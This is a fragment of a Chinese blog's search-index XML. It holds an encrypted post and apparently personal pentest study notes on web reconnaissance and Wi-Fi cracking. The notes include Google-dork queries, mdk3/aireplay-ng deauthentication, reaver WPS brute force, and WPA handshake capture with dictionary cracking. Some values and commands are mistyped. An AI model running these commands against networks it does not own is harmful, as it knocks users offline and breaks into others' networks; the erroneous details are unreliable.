      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" 请输入文章密码！ "> <label for="pass"> 请输入文章密码！ </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>  <script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      <categories>
          
          <category> 生活 </category>
          
          <category> 胡思乱想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 胡思乱想 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>web渗透技术知识小记</title>
      <link href="/posts/bb6c190a.html"/>
      <url>/posts/bb6c190a.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="渗透脑图"><a href="#渗透脑图" class="headerlink" title="渗透脑图"></a>渗透脑图</h1><h2 id="1-渗透步骤漏洞"><a href="#1-渗透步骤漏洞" class="headerlink" title="1.渗透步骤漏洞"></a>1.渗透步骤漏洞</h2><p><img src="/posts/../../images/naotu/shentou.jpg" alt=""></p><h2 id="2-渗透思路脑图"><a href="#2-渗透思路脑图" class="headerlink" title="2.渗透思路脑图"></a>2.渗透思路脑图</h2><p><img src="/posts/../../images/naotu/4.jpg" alt=""></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-域名、ip等信息查询在线网站"><a href="#1-域名、ip等信息查询在线网站" class="headerlink" title="1.域名、ip等信息查询在线网站"></a>1.域名、ip等信息查询在线网站</h2><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">站长之家</a><br><a href="http://www.links.cn/" target="_blank" rel="noopener">seo站长帮手</a><br><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">站长统计</a><br><a href="https://whois.aizhan.com/target.com/" target="_blank" rel="noopener">爱站</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步在线</a><br><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a><br><a href="http://www.whomx.com/" target="_blank" rel="noopener">虎妈查</a><br><a href="https://github.com/search?utf8=%E2%9C%93&amp;q=&amp;type=" target="_blank" rel="noopener">github</a><br><a href="https://exploits.shodan.io" target="_blank" rel="noopener">shadon</a><br><a href="https://www.zoomeye.org" target="_blank" rel="noopener">ZoomEy</a><br><a href="https://search.yahoo.com/" target="_blank" rel="noopener">雅虎搜索</a><br><a href="http://www.dogpile.com/?qc=video" target="_blank" rel="noopener">Dogpile</a>  </p><h2 id="2-开放的端口查询"><a href="#2-开放的端口查询" class="headerlink" title="2.开放的端口查询"></a>2.开放的端口查询</h2><p>1.常用的工具<br>1)nmap扫描<br><a href="http://www.freebuf.com/sectool/112583.html" target="_blank" rel="noopener">2)masscan</a>  </p><h2 id="3-web漏洞查找"><a href="#3-web漏洞查找" class="headerlink" title="3.web漏洞查找"></a>3.web漏洞查找</h2><p>1.后台查找<br>1）Googlehack<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xx.com intext:管理  </span><br><span class="line">site:xx.com intext: 用户名 密码 </span><br><span class="line">site:xx.com inurl:login</span><br><span class="line">site:xx.com inurl:manage</span><br><span class="line">site:xx.com inurl:admin</span><br><span class="line">site:xx.com intitle:后台</span><br><span class="line">site:xx.com intitle: 管理</span><br></pre></td></tr></table></figure></p><p>2）御剑<br>2.目录漏洞<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index of </span><br><span class="line">to parent directory</span><br></pre></td></tr></table></figure></p><p>3.工具检测漏洞<br>wvs<br>appscan<br>椰树<br>4.sql注入工具<br>sqlmap  </p><h2 id="4-系统漏洞查找"><a href="#4-系统漏洞查找" class="headerlink" title="4.系统漏洞查找"></a>4.系统漏洞查找</h2><p>1.nessus  </p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>无线渗透测试小识</title>
      <link href="/posts/8599fc6c.html"/>
      <url>/posts/8599fc6c.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="监听wifi"><a href="#监听wifi" class="headerlink" title="监听wifi"></a>监听wifi</h1><p>无线网络中的信号是以广播模式发送的，所有用户就可以在传送管程中截获到这些信息。<br>1.网卡的工作模式<br>无线网卡是采用无线信号进行数据传输的终端。<br>4种模式：<br>广播模式：它的物理地址是0xffffff的帧为广播帧，工作在广播模式的网卡接受广播帧<br>多播传送：多播传送地址作为目的物理地址的帧可以被组内的其他主机同时接收，而组外主机却接收不到。但是如果将网卡设置为多播传送模式，它可以接收所有的多播传送帧，而不论它是不是组内成员。<br>直接模式：工作在混杂模式下的网卡只接收目的地址是自己mac地址的帧。<br>混杂模式：工作在混杂模式下的网卡，接受所有的流过网卡的帧。通信包捕获程序就是在这种模式下运行的。<br>2.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwconfig 查看无线接口的配置信息 </span><br><span class="line">ifconfig 查看接口的配置信息</span><br></pre></td></tr></table></figure></p><p>3.Aircrack-ng套件中的小工具<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng    破解WEP,以及WPA(字典攻击)密钥  </span><br><span class="line">airdecap-ng    通过已经知道密钥来解密WEP或WPA嗅探数据  </span><br><span class="line">airmon-ng      将网卡设定为监听模式 </span><br><span class="line">aireplay-ng    数据包注入工具</span><br><span class="line">airodump-ng    数据包嗅探，将无线网络数据输送到PCAP或IVS文件并显示网络信息</span><br><span class="line">airtun-ng      创建虚拟管道 </span><br><span class="line">airolib-ng     保存、管理ESSID密码列表 </span><br><span class="line">packetforge-ng  创建数据包注入用的加密包 </span><br><span class="line">Tools          混合、转换工具</span><br><span class="line">airbase-ng    软件模拟AP</span><br><span class="line">airdecloak-ng 消除pcap文件中的WEP加密包 </span><br><span class="line">airdriver-ng  无线设备驱动管理工具 </span><br><span class="line">airolib-ng    保存、管理ESSID密码列表、计算对应的密钥 </span><br><span class="line">airserv-ng    允许不同的进程访问无线网卡</span><br><span class="line">buddy-ng     easside-ng文件的描述</span><br><span class="line">esside-ng    和AP接入点通信（无WEP）</span><br><span class="line">tkiptun-ng   WPS/TKIP攻击 </span><br><span class="line">wesside-ng   自动破解WEP密钥</span><br></pre></td></tr></table></figure></p><p>4<br>1）将无线网卡启动监听模式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng start interface[channel] 启动监听模式</span><br><span class="line">airmon-ng stop interface[channel] 关闭监听模式</span><br></pre></td></tr></table></figure></p><p>2）将网卡设置为混杂模式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure></p><p>3）扫描网络范围   </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng [选项] wlan0mon</span><br><span class="line">-c   指定目标AP的工作信道</span><br><span class="line">-i,-ivs  仅保存可用于破解的IVS数据报文 </span><br><span class="line">-w  指定一个自己希望保存的文件名，用来保存有效的IVS数据报文</span><br></pre></td></tr></table></figure><p>参数解读<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BSSID 表示无线AP的mac地址 </span><br><span class="line">PWR   网卡报告的信号水平，它主要取决于驱动。AP离计算机，信号越高。如果部分客户端的PWR为-1，那么说明该客户端不在当前网卡能监听到的范围内，但是能捕获到AP发往客户端的数据。如果所有的客户端PWR值都为-1，那么说明网卡驱动不支持信号水平报告。    </span><br><span class="line">Beasons   无线AP 发出的编号，每个AP在最低速率（1M）时差不多每秒会发送10个左右的beacon。    </span><br><span class="line"><span class="comment">#Data  被捕捉到的数据分组分量  </span></span><br><span class="line"><span class="comment">#/s    过去10秒内每秒捕获数据分组的数量  </span></span><br><span class="line">CH     信道号</span><br><span class="line">MB     无线AP所支持的最大速率  </span><br><span class="line">ENC    使用的几码算法体系。OPN表示无加密，WEP？表示wep或者wpa/wpa2  </span><br><span class="line">CIPHER 检测到的加密算法  </span><br><span class="line">AUTH   使用认证协议 常用的有MGT(WPS/WPA2使用独立的认证服务器，平时我们常说的802.1x、radius、eap等),SKA（WEP的共享密钥），PSK(WPA/WPA2的预共享密钥) 或者OPN(WEP开放式）     </span><br><span class="line">ESSID   也就是所谓的SSID号   </span><br><span class="line">STATION 客户端的mac地址 </span><br><span class="line">Rate    输出速率 </span><br><span class="line">Lost    在过去10秒内丢失的数据分组，基于序列号检测。  </span><br><span class="line">Frames  客户端发送的数据分组数量  </span><br><span class="line">Probe    v被客户端查探的ESSID.</span><br></pre></td></tr></table></figure></p><p>5<br>强制客户端下线<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mdk3 interface mode options </span><br><span class="line">mode： 指定测试模式。  </span><br><span class="line">a   dos模式  </span><br><span class="line">b   beacon洪水模式 </span><br><span class="line">d   解除验证/解除关联暴力模式   </span><br><span class="line">f   mac过滤暴力模式  </span><br><span class="line">g   wpa 降级测试  </span><br><span class="line">m   关闭开发  </span><br><span class="line">p   基本探测和ESSID暴力模式</span><br><span class="line">w   WIDS/WIPS混乱  </span><br><span class="line">x   802.1测试</span><br></pre></td></tr></table></figure></p><p>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mdk3 mon0 d -s 120 0 -c 1,6,11</span><br></pre></td></tr></table></figure></p><h1 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h1><p>1.过滤<br>比较运算符<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eq     ==</span><br><span class="line">ne     !=</span><br><span class="line">gt     &gt;</span><br><span class="line">lt     &lt;</span><br><span class="line">ge     &gt;=v</span><br><span class="line">le     &lt;=</span><br></pre></td></tr></table></figure></p><p>1)ip过滤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip.addr==ip   </span><br><span class="line">ip.src_host==ip  显示来源ip </span><br><span class="line">ip.dst_host==ip  显示目标ip</span><br></pre></td></tr></table></figure></p><p>2)端口过滤   </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcp.port </span><br><span class="line">tcp.dstport==80</span><br><span class="line">tcp.srcport==80</span><br></pre></td></tr></table></figure><p>3)协议过滤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">udp arp icmp http smtp ftp dns msnms ip ssl 等  </span><br><span class="line">排除udp  !udp或者not udp</span><br></pre></td></tr></table></figure></p><p>4)包长度过滤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">udp.length==26  udp本身固定长度8加上udp下面那块数据包之和</span><br><span class="line">tcp.len&gt;=7      表示ip数据包(tcp下面那块数据）不包括tcp本身  </span><br><span class="line">ip.len==94      除了以太网头固定长度14，其他都是ip.len,即从ip本身到最后  </span><br><span class="line">frame.len==119   表示整个数据包长度，从eth开始到最后</span><br></pre></td></tr></table></figure></p><p>5)http模式过滤<br>指定get包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.request.method==<span class="string">"GET"</span> &amp;&amp; http contains <span class="string">"host"</span></span><br><span class="line">http.request.method==<span class="string">"GET"</span> &amp;&amp; http contains <span class="string">"User-Agent"</span></span><br></pre></td></tr></table></figure></p><p>指定post包 如上<br>指定响应包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http contains <span class="string">"HTTP/1.1 200 OK"</span> &amp;&amp; http contains <span class="string">"Content-Type:"</span></span><br></pre></td></tr></table></figure></p><p>6)表达式  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!(arp.src==192.168.1.1) and !(arp.dst.proto_ipv4==192.168.1.11</span><br></pre></td></tr></table></figure><p>2.802.11数据结构<br>无线数据包和有限数据包的主要不同在于额外的802.11头部。这是一个第二层的头部，包含与数据包和传输介质有关的额外信息。<br>802.11数据包的三种类型：管理帧、控制帧、数据帧<br>分析特定的包类型<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wc.fc.type_subtype</span><br></pre></td></tr></table></figure></p><p>分析特定频率的包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">radiotap.channel.freq</span><br><span class="line"></span><br><span class="line">信道     中心频率 </span><br><span class="line">1        2412</span><br><span class="line">2        2317</span><br><span class="line">13       2472</span><br></pre></td></tr></table></figure></p><p>3.wep认证包<br>4.wpa认证包<br>5.RSSI 显示捕获数据包的射频信号强度<br> TX Rate 显示捕获数据包的数据率<br> Frequency/Channel 显示捕获数据包的频率和信道<br>6 qq使用ociq协议   </p><h1 id="WPS加密"><a href="#WPS加密" class="headerlink" title="WPS加密"></a>WPS加密</h1><p>1.wps支持两种模式：个人识别码模式和按钮模式<br>2.wps在某些设备上也是QQS<br>3.reaver是一个暴力破解wps加密的工具<br>将无线网卡设置为监听模式<br>例子：已知PIN码是12345678<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reaver -i mon0 -b ap的mac地址 -p 12345678</span><br></pre></td></tr></table></figure></p><p>不知时，暴力破解<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reaver -i mon0 -b ap的mac地址 -vv</span><br></pre></td></tr></table></figure></p><p>4.wifite是一款自动化wep和wpa破解工具<br>启动WiFite<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wifite -pps 660</span><br></pre></td></tr></table></figure></p><p>ctrl +c 停止扫描<br>选择ap编号<br>5.fern wifr cracker 可以破解并恢复wep、wpa和wps的无线网络密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fern-wifi-cracker</span><br></pre></td></tr></table></figure></p><h1 id="WEP加密模式"><a href="#WEP加密模式" class="headerlink" title="WEP加密模式"></a>WEP加密模式</h1><p><img src="http://p4gdp8beq.bkt.clouddn.com/1asdfasdfsd.png" alt=""><br>1.wpd加密认证类型：<br>开放系统认证<br>共享密钥认证<br>2.Aircrack-ng工具主要是用于网络侦测、数据包嗅探以及wep和wpa/wpa2-pskf破解。<br>1)查看系统中的无限网路接口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure></p><p>2)将该无线网卡设置为监听模式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng start mon0</span><br></pre></td></tr></table></figure></p><p>3)扫描附近的wifi网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon0</span><br></pre></td></tr></table></figure></p><p>4)选择wep模式加密的目标,捕获数据包，生成wireless-o1.ivs文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng --ivs -w wireless --bssid ap的mac  -c 6 wlan0mon </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--ivs     设置过滤，保存可用于破解的ivs包 </span><br><span class="line">-w        指定捕获数据包要保存的文件名  </span><br><span class="line">--bssid   来指定攻击目标的BSSID </span><br><span class="line">-c        指定攻击目标ap的工作频道</span><br></pre></td></tr></table></figure></p><p>5）捕获一定的数据包后，开始进行破解<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng wireless-01.ivs</span><br></pre></td></tr></table></figure></p><p>3.wifite工具，进行破解 </p><h1 id="WPA加密模式"><a href="#WPA加密模式" class="headerlink" title="WPA加密模式"></a>WPA加密模式</h1><p>1.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 1 6 abcdef -o password.txt</span><br></pre></td></tr></table></figure></p><p>2.pwgen工具可以说横溢难以忘记的随机密码或容易记住的密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwgen -1 -y</span><br></pre></td></tr></table></figure></p><p>3.RainbowCrack创建彩虹表<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rtgen 彩虹表生成工具，生成口令、散列值对照表 </span><br><span class="line">rtsort 排序彩虹表，为rcrack提供输入  </span><br><span class="line">rcrack  使用排好序的彩虹表进行口令破解</span><br></pre></td></tr></table></figure></p><p>例子：<br>1)创建一个md5算法加密的彩虹表,文件保存在/usr/share/rainbowcrack下。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rtgen md5 numeric 5 5 0 100 200 0</span><br></pre></td></tr></table></figure></p><p>2）对生成的彩虹表进行排序 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rtsort md5_numeric<span class="comment">#5-5_0_100x200_0.rt</span></span><br></pre></td></tr></table></figure><p>3)破解哈希值md5(11111)= b0baee9d279d34fa1dfd71aadb908c3f<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rcrack  md5_numeric<span class="comment">#5-5_0_100x200_0.rt -h b0baee9d279d34fa1dfd71aadb908c3f</span></span><br></pre></td></tr></table></figure></p><p>4.Aircrack-ng工具破解<br>修改当前无线网卡的mac地址<br>1）查看本机无线网络接口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng</span><br></pre></td></tr></table></figure></p><p>2)停止无线网络接口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng stop wlan0</span><br></pre></td></tr></table></figure></p><p>3)修改无线网卡的mac地址为00:11:22:33:44:55<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">macchanger --mac 00:11:22:33:44:55</span><br></pre></td></tr></table></figure></p><p>4)启用无线网络接口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arimon-ng start wlan0</span><br></pre></td></tr></table></figure></p><p>5)捕获数据包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure></p><p>6)捕获test无线网络的数据包，成功捕获握手包后，生成的文件名为wpa-01.cap<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng -c 1 -w wpa -bssid 目标ap的mac  wlan0mon`</span><br></pre></td></tr></table></figure></p><p>如果一直没有捕获到握手包 可以使用aireplay-ng命令进行Deauth攻击，强制客户端重新连接到wifi网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 1 -a ap的mac地址 -c 客户端的mac地址 wlan0mon</span><br></pre></td></tr></table></figure></p><p>7)Deauth攻击<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 1 -a ap的mac地址 -c 客户端的mac地址 wlan0mon</span><br></pre></td></tr></table></figure></p><p>8）破解密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w dic 捕获的<span class="built_in">cap</span>文件</span><br></pre></td></tr></table></figure></p><p>5.wifite<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wifite -dict 